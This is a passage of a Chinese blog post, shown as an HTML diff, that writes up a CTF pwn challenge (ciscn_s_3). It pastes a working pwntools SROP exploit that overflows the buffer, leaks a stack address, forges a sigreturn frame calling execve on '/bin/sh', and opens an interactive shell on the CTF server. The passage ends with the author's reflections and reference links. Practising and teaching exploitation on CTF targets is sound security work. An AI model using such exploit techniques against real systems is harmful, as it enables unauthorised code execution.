+            alt="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827162304078.png" />
+    </a><figcaption class="image-caption">执行结果</figcaption>
+    </figure></p>
+<h2 id="0x03-sigreturnsrop解法">0x03 sigreturn/SROP解法</h2>
+<p>贴一下别人的exp，等我学习一下SROP再回过头来看。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+<span class="n">p</span> <span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node3.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26063</span><span class="p">)</span><span class="c1"># process(&#39;./ciscn_s_3&#39;) # </span>
+<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ciscn_s_3&#39;</span><span class="p">)</span>
+<span class="n">mov_rax_15_ret</span> <span class="o">=</span> <span class="mh">0x4004da</span>
+<span class="n">vuln_addr</span> <span class="o">=</span> <span class="mh">0x4004ed</span>
+<span class="n">syscall_addr</span> <span class="o">=</span> <span class="mh">0x400517</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">)</span>
+
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x118</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;stack addr: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">))</span>
+
+<span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mh">0x3b</span> <span class="c1"># syscall::execve, constants.SYS_execve is also ok</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_addr</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">stack_leak</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_15_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="0x04-总结">0x04 总结</h2>
+<p>这题从不会，到看懂一种解法，以及查资料、gdb调试、尝试gdb+wsl2+pwntools联合调试、弄wsl ubuntu18、迁移占用c盘空间太多的wsl2-ubuntu20、写博客&hellip;，前前后后搞了差不多一天的时间🤣，一个字，疲惫=.=</p>
+<p>不过总的来说，收获还是很多的，继续学吧</p>
+<h3 id="参考链接">参考链接</h3>
+<ul>
+<li><a href="https://www.cnblogs.com/lxy8584099/p/12013771.html" target="_blank" rel="noopener noreffer">关于32位和64位Linux的系统调用</a></li>
+<li><a href="https://abcdxyzk.github.io/blog/2012/11/23/assembly-args/" target="_blank" rel="noopener noreffer">x64寄存器传参</a></li>
+<li><a href="http://liul14n.top/2020/03/07/Ciscn-2019-s-3/" target="_blank" rel="noopener noreffer">Ciscn_2019_s_3</a></li>
+</ul>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
